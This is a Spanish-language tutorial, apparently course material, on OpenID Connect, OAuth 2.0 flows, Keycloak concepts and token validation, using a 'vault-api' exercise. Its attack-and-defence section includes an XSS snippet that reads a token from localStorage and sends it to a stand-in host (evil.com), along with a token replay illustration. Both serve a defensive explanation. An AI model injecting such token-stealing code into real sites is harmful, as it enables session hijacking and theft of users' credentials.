# 📚 Teoría: OpenID Connect (OIDC) y Federación de Identidades

## 🎯 Introducción: El Problema de la Identidad Distribuida

Imagina que trabajas en una **ciudad corporativa** donde hay múltiples edificios de diferentes empresas. Cada edificio tiene su propio sistema de seguridad:

- **Edificio A**: Tarjeta azul
- **Edificio B**: Tarjeta roja  
- **Edificio C**: Huella dactilar
- **Edificio D**: Código PIN

Como empleado que necesita acceder a los 4 edificios, tendrías que:
- ❌ Registrarte 4 veces
- ❌ Recordar 4 credenciales diferentes
- ❌ Llevar 4 tarjetas diferentes
- ❌ Hacer 4 logins separados cada día

**Esto es ineficiente, frustrante y costoso.**

---

### La Solución: Una Oficina Central de Identidad

Ahora imagina que la ciudad construye una **Oficina Central de Identidad** donde:

1. Te registras **UNA SOLA VEZ** con todos tus datos
2. Te dan una **credencial universal** (un QR code en tu smartphone)
3. Esta credencial funciona en **TODOS los edificios**
4. Cada edificio confía en la Oficina Central
5. Solo haces login **una vez al día**

**Esto es OpenID Connect (OIDC)** en el mundo digital. 🌐

- **Oficina Central de Identidad** = Identity Provider (Keycloak)
- **Credencial Universal** = Access Token OIDC
- **Edificios** = Aplicaciones (Quarkus, React, Mobile App)
- **Login una vez** = Single Sign-On (SSO)

---

## 📖 Definición Formal de OIDC

**OpenID Connect (OIDC)** es un protocolo de autenticación construido sobre **OAuth 2.0** que permite a las aplicaciones **delegar** la autenticación a un **Identity Provider** externo.

### Características Principales

| Característica | Descripción |
|----------------|-------------|
| **Protocolo abierto** | Estándar público, no propietario |
| **Basado en OAuth 2.0** | Extiende OAuth agregando autenticación |
| **Token-based** | Usa JSON Web Tokens (JWT) |
| **RESTful** | Comunicación HTTP estándar |
| **Interoperable** | Funciona entre diferentes plataformas |
| **Federación** | Soporta múltiples Identity Providers |

---

## 🆚 OAuth 2.0 vs OpenID Connect

### OAuth 2.0 (Autorización)

**Pregunta que responde:** "¿Qué puede hacer este usuario?"

```
Usuario → App: "Quiero que Google Drive acceda a mis fotos de Facebook"
Facebook: "OK, aquí está un token que permite LEER tus fotos"
Google Drive: [Usa el token para acceder a las fotos]
```

**OAuth 2.0 NO dice quién eres**, solo qué permisos tienes.

---

### OpenID Connect (Autenticación + Autorización)

**Pregunta que responde:** "¿Quién es este usuario?" + "¿Qué puede hacer?"

```
Usuario → App: "Quiero iniciar sesión"
Keycloak: "OK, autentícate conmigo"
Usuario: [Ingresa credenciales en Keycloak]
Keycloak → App: "Este es Juan Pérez (ID Token) y puede acceder a recursos (Access Token)"
App: "Hola Juan, bienvenido"
```

**OIDC añade identidad sobre OAuth 2.0.**

---

### Tabla Comparativa

| Aspecto | OAuth 2.0 | OpenID Connect |
|---------|-----------|----------------|
| **Propósito** | Autorización | Autenticación + Autorización |
| **Pregunta** | ¿Qué puede hacer? | ¿Quién es? + ¿Qué puede hacer? |
| **Tokens** | Access Token | Access Token + ID Token |
| **Info del usuario** | No | Sí (claims en ID Token) |
| **Uso típico** | Acceso a APIs | Login de usuarios |
| **Ejemplo** | "Dar acceso a mis fotos" | "Iniciar sesión con Google" |

**Analogía:**
- **OAuth 2.0** = Te dan una llave de hotel que abre tu habitación (autorización)
- **OIDC** = Te registras en recepción (autenticación) Y te dan la llave (autorización)

---

## 🏗️ Arquitectura OIDC: Los Actores

### 1. End User (Usuario Final)

**Quién es:** La persona que quiere acceder a la aplicación.

**Qué hace:**
- Inicia sesión
- Proporciona credenciales
- Autoriza acceso a sus datos

**Analogía:** El ciudadano que va a la Oficina de Identidad.

---

### 2. Relying Party (RP) - Aplicación Cliente

**Quién es:** La aplicación que necesita autenticar usuarios (nuestra app Quarkus).

**Qué hace:**
- Redirige al usuario al Identity Provider
- Recibe tokens del IdP
- Valida tokens
- Autoriza acceso a recursos

**Analogía:** El edificio que necesita verificar tu credencial.

**En nuestro ejercicio:** `vault-api` (aplicación Quarkus)

---

### 3. Identity Provider (IdP) - Proveedor de Identidad

**Quién es:** El servicio centralizado que autentica usuarios (Keycloak, Auth0, Okta, Google).

**Qué hace:**
- Gestiona usuarios y contraseñas
- Autentica usuarios
- Emite tokens (Access Token, ID Token)
- Gestiona roles y permisos
- Proporciona endpoints de autenticación

**Analogía:** La Oficina Central de Identidad.

**En nuestro ejercicio:** Keycloak

---

### 4. Authorization Server

**Quién es:** Componente del IdP que emite tokens OAuth 2.0.

**Qué hace:**
- Valida credenciales
- Genera Access Tokens
- Renueva tokens (refresh)
- Revoca tokens

**En OIDC:** Típicamente es parte del Identity Provider.

---

### Diagrama de Interacción

```
┌──────────────┐
│   End User   │  "Quiero acceder a vault-api"
└──────┬───────┘
       │
       │ 1. Request
       ▼
┌──────────────────────┐
│   Relying Party      │  "Necesito autenticarte"
│   (vault-api)        │
└──────┬───────────────┘
       │
       │ 2. Redirect to IdP
       ▼
┌──────────────────────┐
│  Identity Provider   │  "Ingresa tus credenciales"
│    (Keycloak)        │
└──────┬───────────────┘
       │
       │ 3. User authenticates
       │ 4. Issue tokens
       ▼
┌──────────────┐
│   End User   │  Recibe tokens
└──────┬───────┘
       │
       │ 5. Send tokens to app
       ▼
┌──────────────────────┐
│   Relying Party      │  6. Validate tokens
│   (vault-api)        │  7. Grant access
└──────────────────────┘
```

---

## 🎫 Tokens en OIDC

### Access Token

**Propósito:** Autorización - permite acceder a recursos protegidos.

**Formato:** JWT (JSON Web Token)

**Contiene:**
- Permisos (scopes)
- Roles
- Expiración (típicamente 5-15 minutos)
- Emisor (Keycloak)

**Uso:**
```http
GET /api/external/secrets/public
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Analogía:** Tu tarjeta de acceso al edificio.

---

### ID Token

**Propósito:** Autenticación - contiene información sobre el usuario.

**Formato:** JWT (JSON Web Token)

**Contiene:**
- `sub`: User ID
- `name`: Nombre completo
- `email`: Email
- `email_verified`: Email verificado
- `preferred_username`: Username
- `iat`: Issued at
- `exp`: Expiration

**Uso:** La aplicación lo lee para saber quién eres.

**Analogía:** Tu credencial con foto y datos personales.

---

### Refresh Token

**Propósito:** Renovar Access Tokens sin re-autenticarse.

**Formato:** String opaco (no JWT)

**Contiene:** Referencia interna del IdP

**Duración:** Larga (días/semanas)

**Uso:**
```http
POST /realms/vaultcorp/protocol/openid-connect/token
grant_type=refresh_token
refresh_token=abc123...
```

**Analogía:** Un cupón que te permite renovar tu credencial sin volver a hacer todo el trámite.

---

### Comparativa de Tokens

| Token | Duración | Renovable | Contiene Info Usuario | Uso |
|-------|----------|-----------|----------------------|-----|
| **Access Token** | Corta (5-15 min) | Con Refresh Token | No (solo permisos) | Acceder a APIs |
| **ID Token** | Media (30 min - 1h) | No | Sí (claims) | Saber quién es el usuario |
| **Refresh Token** | Larga (días) | No | No | Renovar Access Token |

---

## 🔄 Flujos de Autenticación OIDC

### 1. Authorization Code Flow (Más Seguro)

**Cuándo usar:** Aplicaciones web tradicionales, SPAs con backend.

**Flujo:**

```
1. User → App: "Login"

2. App → Browser: Redirect to Keycloak
   https://keycloak.com/auth?
     client_id=vault-api&
     redirect_uri=http://app.com/callback&
     response_type=code

3. User → Keycloak: Ingresa credenciales

4. Keycloak → Browser: Redirect to app con código
   http://app.com/callback?code=ABC123

5. App → Keycloak: Exchange code for tokens
   POST /token
   code=ABC123
   client_id=vault-api
   client_secret=secret123

6. Keycloak → App: 
   {
     "access_token": "...",
     "id_token": "...",
     "refresh_token": "..."
   }

7. App: Guarda tokens, usuario autenticado ✅
```

**Ventajas:**
- ✅ El Access Token nunca pasa por el navegador
- ✅ Más seguro (requiere client secret en backend)
- ✅ Recomendado para producción

**Desventajas:**
- ❌ Requiere 2 round-trips (código → tokens)
- ❌ Más complejo

---

### 2. Implicit Flow (Deprecated)

**⚠️ NO RECOMENDADO** - Vulnerable a ataques XSS.

Tokens se envían directamente en URL (inseguro).

**Alternativa moderna:** Authorization Code Flow + PKCE

---

### 3. Resource Owner Password Credentials (ROPC)

**Cuándo usar:** Apps altamente confiables (ej: app móvil nativa de la misma empresa).

**Flujo:**

```
1. User → App: Username + Password

2. App → Keycloak:
   POST /token
   grant_type=password
   username=client001
   password=pass001
   client_id=vault-api
   client_secret=secret123

3. Keycloak → App:
   {
     "access_token": "...",
     "id_token": "...",
     "refresh_token": "..."
   }

4. App: Tokens recibidos ✅
```

**Ventajas:**
- ✅ Simple, directo
- ✅ Bueno para testing
- ✅ Un solo request

**Desventajas:**
- ❌ App ve la contraseña del usuario
- ❌ No hay SSO
- ❌ No federación con otros IdP

**En nuestro ejercicio:** Usamos ROPC para simplicidad en las pruebas.

---

### 4. Client Credentials Flow

**Cuándo usar:** Comunicación machine-to-machine (no involucra usuarios).

**Ejemplo:** Microservicio A llama a Microservicio B.

**Flujo:**

```
Service A → Keycloak:
  POST /token
  grant_type=client_credentials
  client_id=service-a
  client_secret=secret-a

Keycloak → Service A:
  { "access_token": "..." }

Service A → Service B:
  GET /api/data
  Authorization: Bearer <access_token>
```

**Características:**
- Sin usuario involucrado
- Solo credenciales del cliente
- Típicamente para servicios backend

---

## 🏢 Keycloak: El Identity Provider

### ¿Qué es Keycloak?

**Keycloak** es un sistema de gestión de identidad y acceso (IAM) de código abierto desarrollado por Red Hat.

**Características:**

| Característica | Descripción |
|----------------|-------------|
| **Open Source** | Gratuito, comunidad activa |
| **OIDC & SAML** | Soporta múltiples protocolos |
| **SSO** | Single Sign-On entre apps |
| **Federación** | Integración con Google, GitHub, LDAP, AD |
| **Gestión de usuarios** | CRUD completo de usuarios |
| **Roles y permisos** | RBAC, grupos, políticas |
| **Temas personalizables** | UI customizable |
| **Multi-tenancy** | Múltiples realms aislados |

---

### Conceptos Clave de Keycloak

#### Realm

**Definición:** Un **Realm** es un espacio aislado que gestiona un conjunto de usuarios, roles, clientes y configuraciones.

**Analogía:** Un realm es como una **empresa independiente** en un edificio corporativo. Cada empresa tiene:
- Sus propios empleados (usuarios)
- Sus propios departamentos (roles)
- Sus propias oficinas (aplicaciones/clients)

**Ejemplos:**
- `empresa-a` → Usuarios de Empresa A
- `empresa-b` → Usuarios de Empresa B
- `vaultcorp` → Nuestro realm del ejercicio

**Características:**
- ✅ Aislamiento total entre realms
- ✅ Configuraciones independientes
- ✅ Usuarios no compartidos

---

#### Client

**Definición:** Un **Client** es una aplicación o servicio que puede solicitar autenticación de usuarios.

**Tipos:**

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| **Confidential** | Puede guardar secretos (backend) | API REST, app con servidor |
| **Public** | No puede guardar secretos (frontend) | SPA, app móvil |
| **Bearer-only** | Solo valida tokens, no hace login | Microservicio interno |

**En nuestro ejercicio:**
- Client ID: `vault-api`
- Tipo: Confidential
- Client Secret: Generado por Keycloak

---

#### Roles

**Definición:** Permisos asignados a usuarios.

**Tipos:**

**Realm Roles:**
- Aplicables a TODO el realm
- Ejemplo: `admin`, `customer`, `premium-customer`

**Client Roles:**
- Específicos de un client
- Ejemplo: `vault-api.read`, `vault-api.write`

**Composite Roles:**
- Roles que incluyen otros roles
- Ejemplo: `super-admin` = `admin` + `auditor` + `manager`

---

#### Users

**Definición:** Identidades que pueden autenticarse.

**Atributos:**
- Username (único)
- Email
- First Name / Last Name
- Email Verified
- Enabled / Disabled
- Required Actions (cambiar password, verificar email)

**Credenciales:**
- Password
- OTP (One-Time Password)
- Certificados X.509

---

#### Identity Providers (Federación)

**Definición:** Proveedores externos de identidad que Keycloak puede usar.

**Ejemplos:**
- Google
- GitHub
- Facebook
- LDAP
- Active Directory
- SAML providers

**Uso:**
```
Usuario → Keycloak: "Login"
Keycloak: "¿Cómo quieres autenticarte?"
  1. Username/Password local
  2. Google
  3. GitHub
Usuario: [Selecciona Google]
Google → Keycloak: Token de Google
Keycloak → App: Token de Keycloak
```

**Ventaja:** Los usuarios pueden usar sus cuentas existentes.

---

## 🔒 Seguridad en OIDC

### Validación de Tokens

**Proceso que hace Quarkus:**

```java
1. Recibe request con header:
   Authorization: Bearer eyJhbGci...

2. Extrae el token

3. Decodifica el header del JWT
   { "alg": "RS256", "kid": "abc123" }

4. Obtiene la clave pública de Keycloak
   GET http://keycloak/realms/vaultcorp/protocol/openid-connect/certs

5. Verifica la firma del token
   if (!verify(token, publicKey)) {
     return 401 Unauthorized
   }

6. Verifica expiración
   if (token.exp < now) {
     return 401 Unauthorized
   }

7. Verifica issuer
   if (token.iss != "https://keycloak/realms/vaultcorp") {
     return 401 Unauthorized
   }

8. Extrae roles
   roles = token.realm_access.roles

9. Verifica autorización
   if (!hasRole("customer")) {
     return 403 Forbidden
   }

10. Permite acceso ✅
```

---

### Ataques Comunes y Defensas

#### 1. Token Replay Attack

**Ataque:** Interceptar un token y reutilizarlo.

```
Atacante captura:
  Authorization: Bearer eyJhbGci...

Atacante reutiliza:
  GET /api/secrets
  Authorization: Bearer eyJhbGci...
```

**Defensas:**
- ✅ Expiración corta (5-15 min)
- ✅ HTTPS obligatorio
- ✅ Binding del token a IP/User-Agent
- ✅ Registro de uso de tokens (detectar duplicados)

---

#### 2. Token Substitution

**Ataque:** Reemplazar el token con uno de otro usuario.

**Defensas:**
- ✅ Firma criptográfica (RSA/ECDSA)
- ✅ Validar emisor (`iss`)
- ✅ Validar audiencia (`aud`)

---

#### 3. XSS (Cross-Site Scripting)

**Ataque:** Inyectar JavaScript para robar tokens.

```javascript
// Código malicioso inyectado
let token = localStorage.getItem('access_token');
fetch('https://evil.com/steal?token=' + token);
```

**Defensas:**
- ✅ Guardar tokens en cookies `httpOnly`
- ✅ Content Security Policy (CSP)
- ✅ Sanitizar inputs
- ✅ No guardar tokens en localStorage

---

#### 4. CSRF (Cross-Site Request Forgery)

**Ataque:** Forzar al usuario a hacer requests no deseados.

**Defensas:**
- ✅ Tokens CSRF
- ✅ SameSite cookies
- ✅ Verificar origen (`Origin` header)

---

### Buenas Prácticas de Seguridad

| Práctica | Por qué | Cómo |
|----------|---------|------|
| **HTTPS siempre** | Tokens en texto claro | Certificado SSL/TLS |
| **Tokens de corta vida** | Limitar ventana de ataque | `exp` = 5-15 min |
| **Refresh tokens** | Renovar sin re-login | Guardar en BD, revocables |
| **Validar todos los claims** | Prevenir manipulación | `iss`, `aud`, `exp`, `nbf` |
| **Rate limiting** | Prevenir brute force | Max 5 intentos/min |
| **Auditoría** | Rastrear accesos | Logs de cada autenticación |
| **Logout real** | Invalidar tokens | Blacklist o revocación en Keycloak |

---

## 🎭 Casos de Uso Reales

### 1. SaaS Multi-Tenant

**Escenario:** Tienes una app SaaS donde múltiples empresas usan tu plataforma.

**Solución con OIDC:**
```
Keycloak:
  - Realm: saas-platform
  - Users:
    - user1@empresa-a.com (org: empresa-a)
    - user2@empresa-b.com (org: empresa-b)

Token incluye:
{
  "sub": "user1",
  "email": "user1@empresa-a.com",
  "organization": "empresa-a",  ← Custom claim
  "roles": ["user"]
}

App filtra datos:
  SELECT * FROM secrets WHERE organization = token.organization
```

**Ventaja:** Aislamiento automático por organización.

---

### 2. Integración con Apps Internas

**Escenario:** Empresa con 10 apps internas (CRM, ERP, HR, etc.).

**Sin OIDC:**
- Usuario tiene 10 logins diferentes
- Gestionar usuarios en 10 sistemas
- Cambiar contraseña = actualizar 10 apps

**Con OIDC + Keycloak:**
- Usuario hace login UNA vez en Keycloak
- Token funciona en las 10 apps (SSO)
- Gestionar usuarios = solo Keycloak
- Cambiar contraseña = solo en Keycloak

---

### 3. API Pública con Múltiples Clientes

**Escenario:** Ofreces una API pública que usan apps móviles, web, y partners.

**Sin OIDC:**
- Cada cliente implementa su propio login
- Gestionar API keys manualmente
- Difícil revocar acceso

**Con OIDC:**
```
Keycloak:
  - Client: mobile-app (public)
  - Client: web-app (confidential)
  - Client: partner-app (confidential)

Cada client obtiene tokens con diferentes scopes:
  - mobile-app: read:own, write:own
  - web-app: read:own, write:own, delete:own
  - partner-app: read:all (acceso especial)
```

---

### 4. Federación con Clientes

**Escenario:** Tus clientes ya tienen sus propios sistemas de identidad (Google Workspace, Azure AD).

**Sin OIDC:**
- Clientes deben crear nuevas cuentas
- Gestionar contraseñas adicionales
- Mala experiencia de usuario

**Con OIDC:**
```
Keycloak Identity Brokering:

Cliente → Tu App: "Login"
Tu App → Keycloak: "Autentica"
Keycloak: "¿Usar tu Google Workspace?"
Cliente: "Sí"
Keycloak → Google: "Autentica este usuario"
Google → Keycloak: Token de Google
Keycloak → Tu App: Token de Keycloak (mapeado)
```

**Ventaja:** Clientes usan sus credenciales existentes.

---

## 📊 OIDC vs Alternativas

### Comparativa Completa

| Aspecto | OIDC | SAML | Basic Auth | JWT Propio |
|---------|------|------|-----------|------------|
| **Protocolo** | RESTful (JSON) | XML/SOAP | HTTP Header | RESTful (JSON) |
| **Complejidad** | Media | Alta | Muy baja | Baja |
| **Tamaño tokens** | Medio (JWT) | Grande (XML) | Pequeño | Medio (JWT) |
| **SSO** | ✅ Sí | ✅ Sí | ❌ No | ❌ No |
| **Federación** | ✅ Sí | ✅ Sí | ❌ No | ❌ No |
| **Mobile-friendly** | ✅ Sí | ❌ No | ✅ Sí | ✅ Sí |
| **Moderno** | ✅ Sí | ❌ No (legacy) | ⚠️ Simple | ✅ Sí |
| **Gestión usuarios** | IdP externo | IdP externo | App propia | App propia |
| **Uso típico** | Apps modernas | Enterprise legacy | APIs simples | Apps propias |

---

### ¿Cuándo usar cada uno?

**OIDC:**
- ✅ Apps SaaS modernas
- ✅ Necesitas SSO
- ✅ Múltiples aplicaciones
- ✅ Clientes externos
- ✅ Federación con otros IdP

**SAML:**
- ✅ Integración con sistemas legacy enterprise
- ✅ Ya tienes infraestructura SAML
- ❌ Apps nuevas (usar OIDC en su lugar)

**Basic Auth:**
- ✅ APIs internas muy simples
- ✅ Scripts/herramientas administrativas
- ✅ Desarrollo/testing
- ❌ APIs públicas
- ❌ Aplicaciones de usuario final

**JWT Propio:**
- ✅ App standalone sin necesidad de SSO
- ✅ Control total del proceso
- ✅ Simplicidad (sin IdP externo)
- ❌ Múltiples apps (usar OIDC)
- ❌ Federación (usar OIDC)

---

## 🎓 Conceptos Avanzados

### 1. Token Introspection

**Problema:** ¿Cómo saber si un token sigue siendo válido?

**Solución:** Consultar a Keycloak.

```http
POST /realms/vaultcorp/protocol/openid-connect/token/introspect
token=eyJhbGci...
client_id=vault-api
client_secret=secret123

Response:
{
  "active": true,
  "username": "client001",
  "email": "cliente1@empresa.com",
  "exp": 1234567890,
  "iat": 1234567590
}
```

**Cuándo usar:**
- Validar tokens opacos (no JWT)
- Verificar revocación en tiempo real
- Obtener claims adicionales

---

### 2. Token Exchange

**Problema:** Microservicio A necesita llamar a Microservicio B en nombre del usuario.

**Solución:** Intercambiar token.

```
User → Service A: Access Token (para Service A)

Service A → Keycloak:
  POST /token
  grant_type=urn:ietf:params:oauth:grant-type:token-exchange
  subject_token=<token_original>
  audience=service-b

Keycloak → Service A:
  { "access_token": "<token_para_service_b>" }

Service A → Service B:
  GET /api/data
  Authorization: Bearer <token_para_service_b>
```

**Ventaja:** Propagación segura de identidad entre servicios.

---

### 3. Fine-Grained Authorization

**Problema:** Roles no son suficientes. Necesitas permisos más granulares.

**Ejemplo:**
```
Usuario puede:
  - Leer secretos de su departamento
  - Escribir secretos propios
  - NO puede eliminar secretos de otros
```

**Solución:** User-Managed Access (UMA) en Keycloak.

```
Token incluye permissions:
{
  "authorization": {
    "permissions": [
      {
        "rsid": "secret-123",
        "rsname": "Credenciales AWS",
        "scopes": ["read"]
      },
      {
        "rsid": "secret-456",
        "rsname": "Mi Secreto",
        "scopes": ["read", "write", "delete"]
      }
    ]
  }
}
```

---

### 4. Social Login (Federación)

**Configuración en Keycloak:**

1. En realm `vaultcorp`, agregar Identity Provider:
   - Tipo: Google
   - Client ID: (de Google Cloud Console)
   - Client Secret: (de Google)

2. Mapear claims:
   - Google email → Keycloak email
   - Google name → Keycloak name

3. Usuario final ve:
   ```
   Login con:
   [ Username/Password ]
   [ Login con Google  ]  ← Nueva opción
   [ Login con GitHub  ]
   ```

**Ventaja:** Reducir fricción en el registro.

---

## 🔄 Ciclo de Vida Completo de un Token

```
┌─────────────────────────────────────────────────────────┐
│          CICLO DE VIDA DE UN ACCESS TOKEN               │
└─────────────────────────────────────────────────────────┘

1. GENERACIÓN (iat: 14:00)
   User → Keycloak: Login
   Keycloak: Genera token firmado
   Token.exp = 14:05 (5 minutos)

2. USO (14:00 - 14:05)
   User → App: Bearer <token>
   App: Valida firma ✅
   App: Verifica exp ✅
   App: Permite acceso ✅

3. EXPIRACIÓN (14:05)
   User → App: Bearer <token>
   App: Verifica exp ❌
   App: 401 Unauthorized

4. RENOVACIÓN (14:05)
   User → Keycloak: Refresh Token
   Keycloak: Genera nuevo Access Token
   New Token.exp = 14:10

5. REVOCACIÓN (manual)
   Admin → Keycloak: "Revocar token"
   Keycloak: Marca como inválido
   User → App: Bearer <token>
   App → Keycloak: Introspect
   Keycloak: "active": false
   App: 401 Unauthorized
```

---

## 🧠 Preguntas de Autoevaluación

1. ¿Cuál es la diferencia entre OAuth 2.0 y OIDC?
2. ¿Qué es un Identity Provider?
3. ¿Qué contiene un Access Token vs un ID Token?
4. ¿Por qué OIDC es mejor que gestionar usuarios en tu propia app?
5. ¿Qué es un Realm en Keycloak?
6. ¿Cuál es la diferencia entre un Client confidential y public?
7. ¿Qué flujo OIDC usarías para una app móvil?
8. ¿Por qué los Access Tokens tienen expiración corta?
9. ¿Qué es SSO y cómo lo habilita OIDC?
10. ¿Cuándo usarías OIDC vs JWT propio?

---

## 📚 Recursos Adicionales

### Especificaciones

- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749)
- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)

### Documentación

- [Keycloak Official Docs](https://www.keycloak.org/documentation)
- [Auth0 OIDC Handbook](https://auth0.com/docs/authenticate/protocols/openid-connect-protocol)
- [Quarkus OIDC Guide](https://quarkus.io/guides/security-oidc-bearer-token-authentication)

### Herramientas

- [jwt.io](https://jwt.io) - Debugger de JWT
- [oidcdebugger.com](https://oidcdebugger.com/) - Probar flujos OIDC
- [Keycloak Playground](https://www.keycloak.org/getting-started)

---

## 🎯 Resumen Ejecutivo

### Puntos Clave

1. **OIDC = Autenticación + Autorización** sobre OAuth 2.0
2. **Identity Provider centraliza** gestión de usuarios
3. **SSO mejora UX** - un login para múltiples apps
4. **Federación permite** usar identidades existentes (Google, GitHub)
5. **Tokens tienen ciclo de vida** - generación, uso, expiración, renovación
6. **Keycloak es un IdP completo** - open source, potente, flexible
7. **Seguridad requiere** HTTPS, validación estricta, expiración corta
8. **OIDC vs JWT propio** - OIDC para múltiples apps, JWT para apps standalone

### Decisión Final

**Usar OIDC cuando:**
- Tienes múltiples aplicaciones
- Necesitas SSO
- Quieres federación con otros IdP
- Es una plataforma SaaS

**Usar JWT propio cuando:**
- App standalone simple
- Control total es crítico
- No necesitas SSO
- Quieres evitar dependencia externa
